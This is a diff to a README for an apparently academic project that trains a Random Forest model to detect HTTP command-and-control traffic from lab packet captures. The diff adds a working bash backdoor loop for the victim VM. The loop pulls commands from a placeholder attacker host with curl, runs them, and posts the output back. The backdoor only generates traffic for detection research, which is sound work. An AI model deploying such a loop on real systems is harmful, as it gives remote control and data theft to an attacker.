@@ -13,8 +13,6 @@ Supervised at Vilnius University, MIF.
 
  # Project Structure
 
-- `attacker_vm/` – Scripts and configs for attacker VM  
-- `victim_vm/` – Bash backdoor script for victim VM  
 - `pcap_samples/` – Captured `.pcap` files (`Victim.pcap`, `Attacker.pcap`)  
 - `feature_extraction/` – Feature engineering scripts  
 - `model/` – Training, saved model, and evaluation  
@@ -50,15 +48,24 @@ sudo tcpdump -i eth0 -w Attacker.pcap &
    
 On the Attacker VM, start a Python HTTP server (on port 80) to serve and receive command data.
 
- On the Victim VM, run the bash reverse shell script that:
+## Victim-side Backdoor Agent Bash Script
 
-  - Sends GET requests to /command
-  
- - Executes commands
-  
-- Sends results via POST to /result
-  
-- Captured traffic mimics a C2 communication channel over HTTP.
+This script runs in an infinite loop on the victim machine. It repeatedly:
+
+- Sends a GET request to the attacker’s `/command` endpoint to retrieve commands.
+- Executes the received command locally.
+- Sends the command output back to the attacker via a POST request to `/result`.
+- Waits for 3 seconds before repeating.
+
+```bash
+#!/bin/bash
+while true; do
+  cmd=$(curl -s http://<attacker_ip>/command)
+  result=$(bash -c "$cmd" 2>&1)
+  curl -s -X POST -d "$result" http://<attacker_ip>/result
+  sleep 3
+done
+```
 
 # Data Collection
 After running the attack:
@@ -91,16 +98,15 @@ A Random Forest classifier is trained on the extracted features.
 
 Preprocessing includes standardization (StandardScaler) for time-based features.
 
-Run training:
-
+# To run the ML model:
 ```bash
-python train_model.py
+rmdir /s /q .venv
+python -m venv .venv
+.venv\Scripts\activate
+pip install -r requirements.txt
+python run.py --pcaps Attacker.pcap Victim.pcap
 ```
-Apply model to new .pcap data:
 
-```bash
-python run.py --input new_capture.pcap
-```
 #  Results
 Flags C2-like behavior using HTTP request patterns
 
@@ -117,18 +123,8 @@ Produces detailed predictions including:
 - Generalizes well to unseen traffic
 
 # Example output:
+![image (6)](https://github.com/user-attachments/assets/62c23613-f7fb-4d4e-9a8c-15f961d50110)
 
-```json
-
-{
-  "src_ip": "10.0.0.2",
-  "dst_ip": "10.0.0.1",
-  "uri": "/command",
-  "method": "GET",
-  "time_since_last_request": 3.0,
-  "prediction": "malicious"
-}
-```
 # Requirements
 
 - scikit-learn
